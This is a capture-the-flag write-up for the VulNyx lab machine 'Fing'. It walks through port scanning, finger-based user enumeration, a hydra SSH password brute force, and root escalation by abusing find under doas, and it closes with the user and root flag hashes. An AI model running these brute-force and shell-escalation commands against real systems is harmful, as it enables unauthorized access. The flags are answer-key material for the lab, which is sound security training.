# FING - VulNyx

## Information
**Fing** is a low-difficulty vulnerable Linux virtual machine from the VulNyx platfrom, created by the user **d4t4s3c**, and it runs properly on both VirtualBox and VMware.

## Solution 
### Enumeration
**Nmap**/TCP
Use Nmap to scan the ports on the Fing's IP address (192.168.100.230).
```bash
┌──(dungcngo㉿kali)-[~]
└─$ nmap -n -Pn -sS -p- --min-rate 5000 192.168.100.230
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-03 01:32 EST
Nmap scan report for 192.168.100.230
Host is up (0.045s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
79/tcp open  finger
80/tcp open  http
MAC Address: 08:00:27:6E:57:FA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 128.43 seconds
```
The host at 192.168.100.230 is up, with three services listening: SSH, Finger, and HTTP. All other ports are closed.

```bash
┌──(dungcngo㉿kali)-[~]
└─$ nmap -sVC -p22,79,80 192.168.100.230               
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-03 01:35 EST
Nmap scan report for fing.lan (192.168.100.230)
Host is up (0.0014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
79/tcp open  finger  Linux fingerd
|_finger: No one logged on.\x0D
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
MAC Address: 08:00:27:6E:57:FA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.65 seconds
```
The victim host at 192.168.1.43 is running:
- SSH for remote administration.
- Finger (an old, rarely used service that my leak information).
- An Apache HTTP server with the default page, indicating that the web server is active but no specific application has been deployed yet.

### Shell (Adam)
#### 79/TCP (FINGER)
**Use Brute-Force**
We can perform user enumeration using the Metasploit module **auxiliary/scanner/finger/finger_users**.
```bash
┌──(dungcngo㉿kali)-[~]
└─$ msfconsole 
Metasploit tip: Set the current module's RHOSTS with database values using 
hosts -R or services -R
    ----------------------------...-----------------------------
    
msf > use auxiliary/scanner/finger/finger_users 
msf auxiliary(scanner/finger/finger_users) > set RHOSTS 192.168.100.230
RHOSTS => 192.168.100.230
msf auxiliary(scanner/finger/finger_users) > set THREADS 5
THREADS => 5
msf auxiliary(scanner/finger/finger_users) > set USERS_FILE /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
USERS_FILE => /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt          <----- install seclists (sudo apt -y install seclists)
msf auxiliary(scanner/finger/finger_users) > options

Module options (auxiliary/scanner/finger/finger_users):

   Name        Current Setting           Required  Description
   ----        ---------------           --------  -----------
   RHOSTS      192.168.100.230            yes       The target host(s), see https://docs.meta
                                                   sploit.com/docs/using-metasploit/basics/u
                                                   sing-metasploit.html
   RPORT       79                        yes       The target port (TCP)
   THREADS     5                         yes       The number of concurrent threads (max one
                                                    per host)
   USERS_FILE  /usr/share/wordlists/sec  yes       The file that contains a list of default
               lists/Usernames/xato-net            UNIX accounts.
               -10-million-usernames.tx
               t


View the full module info with the info, or info -d command.
```
After filling the options needed we proceed to run the scanner and get an output: 
```bash
msf auxiliary(scanner/finger/finger_users) > run
[+] 192.168.100.230:79    - 192.168.100.230:79 - Found user: mail
[+] 192.168.100.230:79    - 192.168.100.230:79 - Found user: root
[+] 192.168.100.230:79    - 192.168.100.230:79 - Found user: adam
[+] 192.168.100.230:79    - 192.168.100.230:79 - Found user: news

```
Now we see there are the users **adam** and **root**.

#### 22/TCP (SSH)
**Password Brute-Force**
We can try to brute-force `adam`'s ssh password by **hydra**.
```bash
┌──(dungcngo㉿kali)-[~]
└─$ hydra -t 64 -l adam -P /usr/share/wordlists/rockyou.txt 192.168.100.230 ssh -F -I   
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-03 03:40:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.100.230:22/

[STATUS] 508.00 tries/min, 508 tries in 00:01h, 14343929 to do in 470:37h, 26 active
[22][ssh] host: 192.168.100.230   login: adam   password: passion
[STATUS] attack finished for 192.168.100.230 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-03 03:42:02
```
Got the password `passion`, this gives us an foothold into the system. We can now log into the server.
```bash
┌──(dungcngo㉿kali)-[~]
└─$ ssh adam@192.168.100.230           
The authenticity of host '192.168.100.230 (192.168.100.230)' can't be established.
ED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.230' (ED25519) to the list of known hosts.
adam@192.168.100.230's password: 
Linux fing 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
Last login: Sun Apr 23 13:21:44 2023 from 192.168.1.10
adam@fing:~$ id ; whoami
uid=1000(adam) gid=1000(adam) grupos=1000(adam)
adam
```

### Privilege Escalation
#### Enumeration
The user `adam` has access to the `doas` binary. `Doas` is a UNIX/Linux program that allows a user to run commands in the context of another user. It is similar to the `sudo` command, but `doas` has a simpler setup process.

The configuration for the `doas` program can be found in the `/etc/doas.conf		` file
```bash
adam@fing:~$ cat /etc/doas.conf 
permit nopass keepenv adam as root cmd /usr/bin/find
```
User `adam` is allowed to run the `find` command as root without providing a password, while preserving the current environment.

#### Abuse
The `find` command is used to locate files and directories on a filesystem that match specified parameters.
```bash
adam@fing:~$ doas -u root /usr/bin/find . -exec /bin/sh \; -quit
# bash -pi
root@fing:/home/adam# id ; whoami
uid=0(root) gid=0(root) grupos=0(root)
root
```
We use this cammand spawns as root shell via `doas` by abusing `find` with the `-exec` option to execute `/bin/sh`. Because of `-quit`, `find` stop the first match, but the root shell has already been opened.
Run `bash -pi` to switch from the basic root shell (`sh`) to a full, interactive root bash shell.

#### Flags
With root privileges, we can read both the `user.txt` and `root.txt` flags.
```bash
root@fing:/home/adam# find / -name user.txt -o -name root.txt 2>/dev/null | xargs cat
1edf2dfe68c6745e93affa42be9a80ce
ff18a9aca2d1dac41a5c26e6667bea9d
```

***You are welcome!***
